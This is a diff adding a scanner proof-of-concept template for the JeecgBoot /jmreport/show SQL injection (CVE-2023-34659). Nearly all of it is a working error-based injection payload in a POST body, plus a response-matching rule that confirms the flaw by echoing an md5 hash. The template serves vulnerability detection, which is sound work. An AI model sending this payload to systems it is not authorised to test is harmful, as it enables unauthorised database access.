@@ -1,0 +1,23 @@
+id: poc-yaml-jeecgboot-show-sql-injection
+info:
+  name: JeecgBoot /jmreport/show SQL注入漏洞(CVE-2023-34659)
+  severity: high
+  tags:
+  - CVE-2023-34659
+  - 两高一弱
+  finger: jeecgboot
+variables:
+  t1: random_int(1,100)
+  t2: md5(t1)
+requests:
+- method: POST
+  path: /jeecg-boot/jmreport/show
+  headers:
+    Content-Type: application/json;charset=UTF-8
+  data: '{"id":"961455b47c0b86dc961e90b5893bff05","apiUrl":"","params":"{\"id\":\"1''
+    or ''%1%'' like (updatexml(0x3a,concat(1,(md5({{.t1}}))),1)) or ''%%'' like ''\"}"}
+
+    '
+  expression: status_code == 200 && contains(body, "XPATH syntax error:") && contains(body,t2)
+    && !contains(body, "<")
+transport: http
